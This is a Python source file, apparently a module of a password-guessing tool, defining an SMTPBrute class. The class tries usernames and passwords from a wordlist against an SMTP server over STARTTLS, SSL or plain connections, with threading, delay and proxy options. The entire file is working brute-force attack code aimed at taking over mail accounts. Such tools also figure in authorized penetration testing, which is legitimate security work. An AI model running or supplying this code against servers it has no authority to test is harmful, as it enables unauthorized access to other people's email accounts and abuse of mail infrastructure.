"""SMTP brute-force module."""

import smtplib
import socket
from email.mime.text import MIMEText
from core.bruteforce import BaseBrute


class SMTPBrute(BaseBrute):
    """SMTP brute-force implementation."""

    def __init__(self, target: str, port: int = 587, username: str = "",
                 wordlist: str = "wordlists/passwords.txt", threads: int = 5,
                 output_file: str = None, verbose: bool = False,
                 delay: float = 0.0, proxy: str = None):
        super().__init__(target, port, username, wordlist, threads, output_file, verbose, delay, proxy)
        self.service = "SMTP"

    def try_login(self, username: str, password: str) -> bool:
        """Attempt SMTP login."""
        smtp = None
        try:
            # Try STARTTLS first (port 587)
            if self.port == 587:
                smtp = smtplib.SMTP(self.target, self.port, timeout=5)
                smtp.ehlo()
                smtp.starttls()
                smtp.ehlo()
            # Try SSL (port 465)
            elif self.port == 465:
                smtp = smtplib.SMTP_SSL(self.target, self.port, timeout=5)
                smtp.ehlo()
            # Plain SMTP (port 25)
            else:
                smtp = smtplib.SMTP(self.target, self.port, timeout=5)
                smtp.ehlo()

            smtp.login(username, password)
            smtp.quit()
            return True

        except smtplib.SMTPAuthenticationError:
            return False

        except (smtplib.SMTPException, socket.timeout, ConnectionRefusedError) as e:
            if self.verbose:
                print(f"[!] SMTP error for {username}:{password}: {e}")
            return False

        except Exception as e:
            if self.verbose:
                print(f"[!] Connection error: {e}")
            return False

        finally:
            try:
                if smtp:
                    smtp.quit()
            except Exception:
                pass
